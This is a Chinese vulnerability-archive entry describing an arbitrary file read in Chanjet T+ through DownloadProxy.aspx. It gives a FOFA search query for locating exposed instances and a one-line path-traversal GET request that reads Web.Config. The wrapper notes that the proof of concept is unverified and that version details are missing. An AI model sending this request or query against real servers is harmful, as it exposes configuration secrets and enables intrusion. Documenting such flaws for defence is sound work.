---
source: "MrWQ/vulnerability-paper"
title: "畅捷通T+ DownloadProxy Path文件读取"
product: "畅捷通T+"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未列版本；进程权限/路径布局"
prerequisites: "preload=1条件"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/3OxCCNdncelMJWLjJ-f2qA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%95%85%E6%8D%B7%E9%80%9A/%E7%95%85%E6%8D%B7%E9%80%9A%20TPlus%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "语句**"
id: "vw-24ac0c232aee678901dda706"
entity_id: "ve-24ac0c232aee678901dda706"
schema_version: "1"
---

# 畅捷通T+ DownloadProxy Path文件读取

## 条目说明

- 对象与具体问题：畅捷通T+；DownloadProxy Path文件读取
- 版本、配置及部署条件：未列版本；进程权限/路径布局
- 认证与权限前提：preload=1条件
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 影响版本重复产品名，缺真版本；与215读取段同接口
- 只有请求行和图片，补响应文本/鉴权及补丁
- fofa误抽语句**，去重复法律免责声明与装饰图

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3OxCCNdncelMJWLjJ-f2qA)

**漏洞简介**

畅捷通 T + 专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。用友畅捷通 T+ DownloadProxy.aspx 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件。  
  

**影响版本**

用友 畅捷通 T+  
用友 畅捷通 T+

**FOFA 语句**

```
app="畅捷通-TPlus"

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVwokhO2YicQwKBdcyRkqTyxbLlIsTZPMQ8TSXCX2dJUVPyWf7GU7Zuc6jVRfWoQ4gxpPfdVwCrWhbw/640?wx_fmt=png)

**漏洞复现**

登录页面如下  

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVwokhO2YicQwKBdcyRkqTyxbVR6LDKniad9JaSsXKjnJDW2VuA95iblxTGq1EA3kBjr0eD0EzFgZPUCQ/640?wx_fmt=png)

POC：

```http
GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVwokhO2YicQwKBdcyRkqTyxbqPP4ZfMfZKWD0Yx69auSCSek8NPc8URvBxdQKryrMm93ygwrFibUAaQ/640?wx_fmt=png)

**修复建议**

建议升级至安全版本  

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYa0PicnDzIv4xibegRTm4976s4ZMcq0Ke9uH8TG8RqC4ZbaXK33IrmicxA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金**。

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
